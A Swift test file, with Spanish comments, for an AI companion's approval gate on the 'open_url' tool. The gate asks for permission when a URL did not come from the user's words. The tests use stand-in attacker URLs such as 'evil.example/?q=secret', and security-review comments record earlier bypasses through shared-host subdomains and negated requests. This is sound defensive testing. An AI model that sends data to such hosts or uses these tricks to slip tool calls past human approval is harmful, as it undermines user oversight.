import CompanionCore
import CompanionTestKit
import Foundation
import Testing

// Wave 10c 3D. Solo `open_url`, y solo cuando la URL no salió de las
// palabras de la usuaria: la mitigación estructural al hallazgo de 10a.
@Test @MainActor func parentToolGateTests() {
    testURLSaidByTheUserNeedsNoApproval()
    testURLFromElsewhereNeedsApproval()
    testOtherToolsAreNeverGated()
    testSubdomainsOfSharedHostsNeedTheWholeHost()
    testNegationIsNotConsent()
}

private func call(_ url: String) -> ToolCallRef {
    ToolCallRef(id: "c1", name: "open_url", arguments: "{\"url\":\"\(url)\"}")
}

@MainActor func testURLSaidByTheUserNeedsNoApproval() {
    expect(ParentToolGate.approval(for: call("https://github.com/x/y"), said: "abre github") == nil,
           "dicha: la etiqueta del host basta")
    expect(ParentToolGate.approval(for: call("https://www.bbc.co.uk/news"), said: "open the BBC site") == nil,
           "dicha: sin www y sin sufijo de país")
    expect(ParentToolGate.approval(for: call("https://example.com/a"), said: "abre https://example.com/a") == nil,
           "dicha: la URL entera")
    expect(ParentToolGate.approval(for: call("https://docs.python.org"), said: "Abre docs.python.org por favor") == nil,
           "dicha: el host entero, con mayúsculas alrededor")
}

@MainActor func testURLFromElsewhereNeedsApproval() {
    let request = ParentToolGate.approval(for: call("https://evil.example/?q=secret"), said: "resume esto")
    expectEq(request?.toolName, "open_url", "ajena: pide permiso para open_url")
    expect(request?.inputJSON.contains("evil.example") == true, "ajena: la hoja ve la URL")
    expect(request?.summary.contains("evil.example") == true, "ajena: el resumen nombra el host")
    expect(ParentToolGate.approval(for: call("https://github.com"), said: "abre github.io") != nil,
           "ajena: github.io no es github.com")
    expect(ParentToolGate.approval(for: call("https://gi.thub.com"), said: "abre gi") != nil,
           "ajena: una etiqueta de dos letras no basta")
    expect(ParentToolGate.approval(for: call("not a url"), said: "abre not a url") == nil,
           "ajena: lo que no es URL lo rechaza la política, no la puerta")
}

@MainActor func testOtherToolsAreNeverGated() {
    let app = ToolCallRef(id: "c", name: "open_app", arguments: #"{"name":"Safari"}"#)
    let file = ToolCallRef(id: "c", name: "open_file", arguments: #"{"path":"~/x.md"}"#)
    expect(ParentToolGate.approval(for: app, said: "resume esto") == nil, "otras: open_app no tiene puerta")
    expect(ParentToolGate.approval(for: file, said: "resume esto") == nil, "otras: open_file no tiene puerta")
}

/// Security review 2026-09-05 (CRÍTICO): sin lista de sufijos públicos,
/// `attacker.github.io` daba la etiqueta "github". Con subdominio, solo el
/// host entero cuenta; el atajo por etiqueta es para `marca.tld` (y
/// `marca.co.uk`).
@MainActor func testSubdomainsOfSharedHostsNeedTheWholeHost() {
    expect(ParentToolGate.approval(for: call("https://attacker.github.io/x"), said: "busca en github") != nil,
           "subdominio: github no autoriza attacker.github.io")
    expect(ParentToolGate.approval(for: call("https://evil.example.com/"), said: "abre example") != nil,
           "subdominio: example no autoriza evil.example.com")
    expect(ParentToolGate.approval(for: call("https://attacker.github.io/x"), said: "abre attacker.github.io") == nil,
           "subdominio: el host entero sí")
    expect(ParentToolGate.approval(for: call("https://www.github.com/x"), said: "abre github") == nil,
           "subdominio: www no cuenta como subdominio")
}

/// Security review (ALTO): "no abras evil.example" contenía el host y
/// pasaba como dicho. Una negación en la misma cláusula no es consentimiento.
@MainActor func testNegationIsNotConsent() {
    expect(ParentToolGate.approval(for: call("https://evil.example/"), said: "no abras https://evil.example") != nil,
           "negación: la URL entera negada")
    expect(ParentToolGate.approval(for: call("https://github.com/"), said: "don't open github") != nil,
           "negación: en inglés")
    expect(ParentToolGate.approval(for: call("https://github.com/"), said: "nunca abras github") != nil,
           "negación: nunca")
    expect(ParentToolGate.approval(for: call("https://github.com/"), said: "no sé, abre github") == nil,
           "negación: en otra cláusula no cuenta")
}
